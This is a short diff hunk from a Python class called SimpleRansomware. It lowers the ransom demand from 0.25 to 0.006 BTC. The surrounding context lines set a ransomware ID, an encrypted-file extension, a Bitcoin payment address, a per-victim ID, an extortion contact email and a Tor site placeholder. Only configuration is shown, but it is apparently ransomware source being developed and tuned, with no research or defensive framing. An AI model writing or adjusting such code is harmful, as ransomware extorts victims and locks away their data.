@@ -487,7 +487,7 @@ class SimpleRansomware:
             self.ransomware_id = "ZeroDay"
             self.extension = f".{self.ransomware_id}"
             self.payment_address = "bc1qwc0d85qsu8rct9rzwrpqltdwpstu4j9mltx89d"
-            self.ransom_amount = 0.25  # BTC
+            self.ransom_amount = 0.006  # BTC
             self.victim_id = self.generate_victim_id()
             self.support_email = f"support-{self.victim_id}@protonmail.com"
             self.tor_site = "ERROR 404"
